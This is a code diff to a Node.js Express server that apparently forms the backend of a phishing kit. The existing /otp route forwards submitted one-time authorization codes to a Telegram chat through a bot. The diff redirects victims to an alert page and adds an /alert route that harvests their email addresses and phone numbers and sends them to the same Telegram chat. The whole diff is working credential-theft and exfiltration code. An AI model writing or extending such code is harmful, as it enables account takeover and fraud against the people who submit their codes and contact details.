@@ -45,11 +45,29 @@ app.post("/otp", (req, res) => {
   bot.sendMessage(TELEGRAM_CHAT_ID, otpMessage)
     .then(() => {
       console.log("OTP sent to Telegram");
-      res.send("Authorization code submitted successfully!");
+      res.redirect("/alert.html");
     })
     .catch((error) => {
       console.error("Error sending OTP to Telegram:", error.message);
       res.status(500).send("Error sending OTP to Telegram");
+    });
+});
+
+// Handle POST request for alert form (alert.html)
+app.post("/alert", (req, res) => {
+  const { email, number } = req.body;
+  console.log("Received alert data:", { email, number });
+
+  // Send alert data to Telegram
+  const alertMessage = `Alert information submitted:\nEmail: ${email}\nPhone Number: ${number}`;
+  bot.sendMessage(TELEGRAM_CHAT_ID, alertMessage)
+    .then(() => {
+      console.log("Alert data sent to Telegram");
+      res.send("Alert information submitted successfully!");
+    })
+    .catch((error) => {
+      console.error("Error sending alert data to Telegram:", error.message);
+      res.status(500).send("Error sending alert data to Telegram");
     });
 });
 
